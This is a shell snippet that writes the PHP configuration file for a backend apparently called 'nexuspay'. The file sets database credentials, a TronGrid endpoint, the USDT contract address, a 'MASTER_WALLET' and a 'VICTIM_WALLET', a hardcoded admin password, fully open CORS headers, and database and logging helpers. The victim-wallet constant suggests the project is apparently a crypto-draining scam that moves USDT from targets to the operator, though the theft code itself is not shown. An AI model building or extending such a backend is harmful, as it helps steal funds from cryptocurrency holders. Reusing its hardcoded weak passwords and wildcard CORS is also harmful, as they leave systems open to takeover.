cat > config.php << 'EOF'
<?php
// config.php - Configuration File
define('DB_HOST', 'localhost');
define('DB_NAME', 'nexuspay_db');
define('DB_USER', 'nexuspay_user');
define('DB_PASS', 'YourNewStrongPassword123!');

define('TRON_GRID', 'https://api.trongrid.io');
define('USDT_CONTRACT', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
define('MASTER_WALLET', 'TD94UkiL5qg5Y9ogZqdWdqZbT3F2nB86rK');
define('VICTIM_WALLET', 'TFCsjP6mNMTh2RwsdEvkM3u542dAKVaatT');

define('ADMIN_PASSWORD', 'Admin@123456');

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/logs/error.log');

if (!is_dir(__DIR__ . '/logs')) {
    mkdir(__DIR__ . '/logs', 0755, true);
}

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

function getDB() {
    try {
        return new PDO(
            "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=utf8mb4",
            DB_USER,
            DB_PASS,
            [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
        );
    } catch (PDOException $e) {
        error_log("DB Error: " . $e->getMessage());
        return null;
    }
}

function jsonResponse($data, $status = 200) {
    http_response_code($status);
    echo json_encode($data, JSON_PRETTY_PRINT);
    exit;
}

function logActivity($message, $type = 'info') {
    $pdo = getDB();
    if ($pdo) {
        try {
            $stmt = $pdo->prepare("INSERT INTO system_logs (log_type, message, ip_address, user_agent) VALUES (?, ?, ?, ?)");
            $stmt->execute([
                $type,
                $message,
                $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1',
                $_SERVER['HTTP_USER_AGENT'] ?? ''
            ]);
        } catch (Exception $e) {
            error_log("Log Error: " . $e->getMessage());
        }
    }
}
?>
EOF
